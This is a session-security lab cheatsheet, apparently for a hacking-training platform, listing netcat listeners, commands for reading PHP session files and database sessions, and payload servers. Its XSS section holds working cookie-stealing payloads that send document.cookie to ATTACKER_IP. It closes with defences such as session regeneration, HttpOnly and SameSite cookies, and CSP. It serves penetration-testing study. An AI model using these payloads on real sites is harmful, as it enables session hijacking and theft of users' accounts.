# Session Security Commands Cheatsheet

## Network Configuration
```bash
# Add vhosts to /etc/hosts file
IP=ENTER_SPAWNED_TARGET_IP_HERE
printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts
```

## Traffic Sniffing with Wireshark
```bash
# Start Wireshark
sudo -E wireshark

# Filter for HTTP traffic only (apply in Wireshark)
http
```

## Netcat for Session Capture
```bash
# Listen on port for incoming connections
nc -nlvp 8000

# Alternative port
nc -lvnp 1337
```

## Hash Generation for CSRF Testing
```bash
# Generate MD5 hash of username
echo -n "username" | md5sum
```

## PHP Session Information
```bash
# Locate PHP configuration files
locate php.ini

# Check session save path in PHP config
cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'

# View PHP session files (typically in /var/lib/php/sessions)
ls /var/lib/php/sessions
cat /var/lib/php/sessions/sess_<sessionID>
```

## HTTP Server for Payloads
```bash
# Start PHP development server
php -S <VPN/TUN_Adapter_IP>:8000

# Start Python HTTP server
python -m http.server 1337
```

## Database Session Extraction
```sql
-- Basic database enumeration
SHOW DATABASES;
USE project;
SHOW TABLES;

-- Extract user sessions
SELECT * FROM all_sessions;
SELECT * FROM all_sessions WHERE id=3;
```

## Burp Suite
```bash
# Start Burp Suite
burpsuite
```

## XSS Payloads (Examples)
```javascript
// Basic XSS test
"><img src=x onerror=prompt(document.domain)>

// Cookie stealing with redirect
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://ATTACKER_IP:8000/log.php?c=' + document.cookie;"></video>

// Cookie stealing with fetch (stealthier)
<script>fetch(`http://ATTACKER_IP:8000?cookie=${btoa(document.cookie)}`)</script>

// Mouse hover trigger
<h1 onmouseover='document.write(`<img src="http://ATTACKER_IP:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

## Session Management Code Examples

### PHP Session Regeneration
```php
// Regenerate session ID to prevent fixation
session_regenerate_id(bool $delete_old_session = false): bool
```

### Java Session Management
```java
// Invalidate and create new session
session.invalidate();
session = request.getSession(true);
```

### .NET Session Management
```asp
// Abandon session (note: additional steps needed for complete protection)
Session.Abandon();
```

## Cookie Security Headers
```http
# HTTPOnly cookie (prevents XSS access)
Set-Cookie: sessionid=abc123; HttpOnly

# SameSite cookie (CSRF protection)
Set-Cookie: sessionid=abc123; SameSite=Strict
```

## Content Security Policy
```http
# Basic CSP header
Content-Security-Policy: default-src 'self'
```
